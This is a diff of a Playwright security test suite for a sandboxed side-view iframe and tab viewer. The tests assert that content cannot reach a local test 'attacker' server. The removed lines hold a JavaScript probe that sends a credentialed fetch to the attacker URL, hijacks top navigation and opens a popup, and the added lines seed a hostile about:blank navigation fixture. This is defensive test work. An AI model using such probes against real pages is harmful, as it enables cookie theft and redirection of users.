@@ -148,6 +148,17 @@ def open_side_view(page: Page, artifact: dict[str, int | str], title: str) -> No
     page.evaluate("descriptor => window.atlasSideView.open(descriptor)", descriptor)
     frame = page.frame_locator(".atlas-side-frame")
     frame.locator("body").wait_for(timeout=10000)
+    frame.locator("#marker").wait_for(timeout=10000)
+
+
+def run_fixture(page: Page) -> None:
+    frame = page.frame_locator(".atlas-side-frame")
+    frame.locator("#run").click(timeout=5000)
+    frame.locator("#result").wait_for(timeout=5000)
+
+
+def frame_result(page: Page) -> str:
+    return page.frame_locator(".atlas-side-frame").locator("#result").inner_text()
 
 
 def frame_state(page: Page) -> dict[str, Any]:
@@ -162,11 +173,13 @@ def assert_no_attacker_hits(attacker: AttackerServer, label: str) -> None:
 
 def assert_network_security(page: Page, attacker: AttackerServer) -> None:
     parent_url = page.url
+    run_fixture(page)
     page.wait_for_timeout(3000)
     state = frame_state(page)
     assert state["origin"] == "null", state
     assert state["access"] == EXPECTED_ACCESS, state
     assert state["serviceWorker"] is True, state
+    assert frame_result(page) == "blocked:", frame_result(page)
     assert_no_attacker_hits(attacker, "network and storage")
     assert page.url == parent_url, (parent_url, page.url)
 
@@ -211,22 +224,12 @@ def open_in_tab(
 
 
 def assert_tab_network(tab: Page, attacker: AttackerServer) -> None:
-    tab.evaluate(
-        """async attacker => {
-          const attempts = [];
-          const record = (name, promise) => {
-            attempts.push(name);
-            Promise.resolve(promise).catch(() => {});
-          };
-          record("fetch", fetch(attacker + "/tab-fetch", {credentials: "include"}));
-          try { top.location = attacker + "/tab-top"; } catch (error) {}
-          try { const popup = window.open(attacker + "/tab-popup"); if (popup) attempts.push("popup"); }
-          catch (error) {}
-          window.__atlasTabSecurity = attempts;
-        }""",
-        attacker.url,
-    )
+    tab.locator("#marker").wait_for(timeout=5000)
+    tab.locator("#run").click(timeout=5000)
+    tab.locator("#result").wait_for(timeout=5000)
     tab.wait_for_timeout(500)
+    result = tab.locator("#result").inner_text()
+    assert result == "blocked:", result
     assert_no_attacker_hits(attacker, "open-in-tab network")
     assert len(tab.context.pages) == 2, "a tab popup was opened"
 
@@ -251,6 +254,8 @@ def assert_refusals(page: Page, artifact: dict[str, int | str]) -> None:
 
 
 def assert_stopped_notice(page: Page, attacker: AttackerServer, path: str) -> None:
+    run_fixture(page)
+    assert frame_result(page) == "allowed:", frame_result(page)
     page.wait_for_timeout(2000)
     assert attacker.count(path) == 1, (path, dict(attacker.hits))
     assert page.locator(".atlas-side-stopped").is_visible()
@@ -259,7 +264,9 @@ def assert_stopped_notice(page: Page, attacker: AttackerServer, path: str) -> No
 def assert_storage_shim(page: Page, artifact: dict[str, int | str]) -> None:
     frame = page.frames[-1]
     expect_heading(frame)
+    run_fixture(page)
     assert frame.locator("body").get_attribute("data-score") == "42"
+    assert frame_result(page) == "allowed:", frame_result(page)
     page.get_by_role("button", name="Restart app").click()
     restarted_frame = page.frame_locator(".atlas-side-frame")
     restarted_frame.locator("h1").wait_for(timeout=5000)
@@ -364,6 +371,14 @@ def run_engine(
         "meta-refresh stop",
         lambda: run_stopped_case(
             page, attacker, refresh, "Refresh probe", "/meta-refresh"
+        ),
+    )
+
+    about_blank = seed("hostile-about-blank.html", attacker.url)
+    case(
+        "about:blank navigation stop",
+        lambda: run_stopped_case(
+            page, attacker, about_blank, "About blank probe", "/about-blank-navigation"
         ),
     )
 
